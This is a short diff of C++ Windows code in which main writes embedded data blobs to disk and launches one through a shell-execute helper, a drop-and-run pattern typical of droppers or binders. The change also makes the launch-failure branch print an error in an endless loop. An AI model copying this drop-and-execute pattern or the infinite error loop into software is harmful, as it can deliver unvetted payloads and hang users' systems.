@@ -145,7 +145,6 @@ int main(int argc, char* argv[])
 	#endif
 
 		drop(size2, data2, name2);
-
 		drop(size3, data3, name3);
 
 		bool result = non_exe_launch(name3);
@@ -432,7 +431,9 @@ bool non_exe_launch(std::string name){
 		CloseHandle(sei.hProcess);
 	}
 	else {
-		printf("this is error: %lu", GetLastError());
+		while (1) {
+			printf("this is error: %lu", GetLastError());
+		}
 	}
 	std::cout << "This ran.\n";
 }
